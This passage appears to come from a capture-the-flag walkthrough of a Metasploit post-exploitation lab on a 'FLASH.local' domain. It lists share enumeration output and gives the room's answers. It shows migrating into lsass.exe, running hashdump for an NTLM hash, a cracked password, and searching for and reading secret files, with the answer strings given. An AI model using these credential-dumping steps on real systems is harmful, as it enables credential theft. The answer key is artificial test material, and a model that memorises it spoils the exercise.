[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: speedster
[*] 	Path: C:\Shares\speedster
[*] 	Type: DISK
[*] 
[*] Post module execution completed
```


### Question 4:
What is the NTLM hash of the jchambers user?

**Answer:** 69596c7aa1e8daee17f8e78870e25a5c

List the running process: ps

![image](https://github.com/user-attachments/assets/afe73c5e-98b4-486c-ab51-c7f76087217f)

according to the hint you have to migrate to lsass.exe


![image](https://github.com/user-attachments/assets/bdc2515f-1ce3-4267-b9e5-438c0dfc10a8)


Run the command hashdump:

![image](https://github.com/user-attachments/assets/0414dc18-6a4f-4664-9169-4eeeb021f2fb)


### Question 5: 
What is the cleartext password of the jchambers user?

**Answer:** Trustno1

![image](https://github.com/user-attachments/assets/36bf1542-73a6-476a-8792-d02650ff644f)


### Question 6:
Where is the "secrets.txt"  file located? (Full path of the file)

**Answer:** c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt

search file with this command search -f [file_name]
```bash
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100

meterpreter > 
```

### Question 7:
What is the Twitter password revealed in the "secrets.txt" file?

**Answer:** KDSvbsw3849!

use cat command


![image](https://github.com/user-attachments/assets/b5f09bcf-4630-4dfd-ba36-21d17168792b)


### Question 8:
Where is the "realsecret.txt" file located? (Full path of the file)

**Answer:** c:\inetpub\wwwroot\realsecret.txt

```bash
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100

meterpreter > 
```

### Question 9:
What is the real secret?

**Answer:** The Flash is the fastest man alive

```bash
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100

meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
The Flash is the fastest man alivemeterpreter > 
```
